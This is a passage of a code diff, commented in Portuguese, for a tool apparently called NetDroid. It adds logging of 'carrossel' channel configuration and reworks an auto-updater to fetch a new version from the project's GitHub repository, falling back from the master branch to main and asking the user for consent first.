+    if(btn && original){ btn.innerHTML = original; btn.disabled = false; }
+  }
 }
 
 // ─── Múltiplas Wordlists ────────────────────────
@@ -8777,6 +9213,13 @@ sock.on("carrossel_status",d=>{
 });
 sock.on("carrossel_slot",d=>{
   log(`🔄 Slot ch${d.canal} · ${d.vermelha} vermelha + ${d.azul} azul · ${d.slot_s}s`,"info");
+});
+sock.on("carrossel_config",d=>{
+  const lbl = d.infinito ? `🔒 ∞ ch${d.canal_lockado||"?"}` :
+              (d.slot_vermelha >= 3600 ? `${d.slot_vermelha/3600}h` :
+               d.slot_vermelha >= 60 ? `${d.slot_vermelha/60}min` :
+               `${d.slot_vermelha}s`);
+  log(`⚙ Config carrossel: vermelha=${lbl}`, "info");
 });
 sock.on("carrossel_tick",d=>{
   carrosselState.ativo = !!d.ativo;
@@ -10853,7 +11296,8 @@ class Upgrader:
         self.ui = ui
 
     # Busca uma URL com até 3 tentativas e backoff curto
-    def _fetch(self, url: str, timeout: int = 20, tentativas: int = 3) -> Optional[str]:
+    def _fetch(self, url: str, timeout: int = 20, tentativas: int = 3,
+                 silencioso: bool = False) -> Optional[str]:
         if not HAS_REQUESTS:
             return None
         ua = {"User-Agent": f"NetDroid/{VERSION}"}
@@ -10864,13 +11308,31 @@ class Upgrader:
                 if resp.status_code == 200:
                     return resp.text
                 ultimo_erro = f"HTTP {resp.status_code}"
+                # 404 não vai virar 200 com retry — sai cedo
+                if resp.status_code == 404:
+                    break
             except Exception as e:
                 ultimo_erro = str(e)
             if n < tentativas:
-                self.ui.warn(f"  Tentativa {n}/{tentativas} falhou ({ultimo_erro}). Retentando...")
+                if not silencioso:
+                    self.ui.warn(f"  Tentativa {n}/{tentativas} falhou ({ultimo_erro}). Retentando...")
                 time.sleep(1.5 * n)
-        self.ui.error(f"Falha após {tentativas} tentativas: {ultimo_erro}")
+        if not silencioso:
+            self.ui.error(f"Falha após {tentativas} tentativas: {ultimo_erro}")
         return None
+
+    def _fetch_branch_fallback(self, path: str, timeout: int = 20) -> Tuple[Optional[str], Optional[str]]:
+        """Tenta cada branch em GITHUB_BRANCHES até achar arquivo. Retorna
+        (conteudo, branch_que_funcionou). Útil porque o repo pode estar em
+        master OU main dependendo de quando foi criado."""
+        for branch in GITHUB_BRANCHES:
+            url = GITHUB_RAW_TEMPLATE.format(repo=GITHUB_REPO, branch=branch, path=path)
+            self.ui.info(f"  → tentando branch '{branch}'…")
+            conteudo = self._fetch(url, timeout=timeout, tentativas=2, silencioso=True)
+            if conteudo:
+                self.ui.success(f"  ✓ branch '{branch}' OK ({len(conteudo)} bytes)")
+                return conteudo, branch
+        return None, None
 
     def run(self):
         self.ui.section("AUTO-UPDATE")
@@ -10878,25 +11340,27 @@ class Upgrader:
             self.ui.error("requests não instalado. pip install requests")
             return
         try:
-            self.ui.info("Verificando versão remota em github.com/yamotoz/NetDroid...")
-            version_text = self._fetch(GITHUB_VERSION_URL, timeout=10)
+            self.ui.info(f"Verificando versão remota em github.com/{GITHUB_REPO}…")
+            # Tenta VERSION com fallback master→main (não-fatal)
+            version_text, branch_ver = self._fetch_branch_fallback("VERSION", timeout=10)
             if version_text is None:
-                self.ui.warn("Sem arquivo VERSION remoto — comparando por hash do script.")
+                self.ui.warn("  Sem arquivo VERSION remoto — segue mesmo assim.")
                 remote_version = "?"
             else:
                 remote_version = version_text.strip().splitlines()[0] if version_text.strip() else "?"
-            self.ui.info(f"Local: {VERSION} | Remota: {remote_version}")
+            self.ui.info(f"  Local: {VERSION} | Remota: {remote_version}")
             if remote_version != "?" and remote_version == VERSION:
                 self.ui.success("Já está na versão mais recente.")
                 return
             if not self.ui.consent(f"Atualizar {VERSION} → {remote_version}?"):
                 return
 
-            self.ui.info("Baixando nova versão...")
-            novo_codigo = self._fetch(GITHUB_RAW_URL, timeout=30)
+            self.ui.info("Baixando nova versão…")
+            novo_codigo, branch_usada = self._fetch_branch_fallback("NetDroid.py", timeout=30)
             if novo_codigo is None:
-                self.ui.error("Download abortado.")
+                self.ui.error("Download abortado — repo inacessível em master e main.")
                 return
+            self.ui.info(f"  Origem: branch '{branch_usada}'")
 
             # Validações de segurança antes de sobrescrever
             tamanho = len(novo_codigo.encode("utf-8", errors="ignore"))
